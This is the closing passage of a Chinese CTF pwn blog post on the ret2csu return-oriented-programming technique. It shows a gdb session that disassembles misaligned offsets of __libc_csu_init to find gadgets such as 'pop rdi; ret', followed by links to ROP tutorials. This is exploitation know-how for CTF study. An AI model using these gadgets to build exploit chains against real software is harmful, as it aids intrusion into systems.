+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:	pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:	pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:	pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061B</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:	pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:	pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061C</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:	pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061D</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:	pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061E</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">   0x400625:	nop</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061F</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:	pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">   0x400625:	nop</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">   0x400625:	nop</span><br><span class="line">   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:	pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">   0x400625:	nop</span><br><span class="line">   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400622</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">   0x400625:	nop</span><br><span class="line">   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:	repz ret </span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400623</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:	pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">   0x400625:	nop</span><br><span class="line">   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:	repz ret</span><br><span class="line">assassinq&gt;&gt; quit</span><br></pre></td></tr></table></figure>
+<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu</a><br><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/</a><br><a href="https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="noopener">https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html</a><br><a href="https://www.jianshu.com/p/73fff078c19c" target="_blank" rel="noopener">https://www.jianshu.com/p/73fff078c19c</a><br><a href="https://www.jianshu.com/p/a32dc72bb20f" target="_blank" rel="noopener">https://www.jianshu.com/p/a32dc72bb20f</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/02/15/为Windows系统鼠标右键添加软件和图标/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          为Windows系统鼠标右键添加软件和图标
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/02/10/2019-吾爱破解解题领红包活动/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2019-吾爱破解解题领红包活动</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#分析程序"><span class="nav-number">1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编写exp"><span class="nav-number">2.</span> <span class="nav-text">编写exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">3.</span> <span class="nav-text">参考网站</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 AssassinQ All Rights Reserved.
+        
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+      var headerblur = document.getElementById("header-blur");
+      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
